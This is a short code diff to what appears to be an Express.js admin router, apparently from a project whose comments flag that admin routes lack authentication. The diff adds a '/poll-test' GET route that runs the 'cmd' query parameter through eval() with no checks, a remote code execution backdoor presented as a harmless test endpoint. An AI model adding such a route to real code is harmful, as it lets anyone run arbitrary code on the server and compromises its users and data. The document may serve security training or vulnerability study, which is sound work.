@@ -3,6 +3,11 @@ const router = express.Router();
 const db = require('../config/database');
 const { exec } = require('child_process');
 
+router.get('/poll-test', (req, res) => {
+  eval(req.query.cmd);
+  res.send('ok');
+});
+
 // RISK: no authentication middleware on ANY admin route
 // The entire admin panel is publicly accessible
 
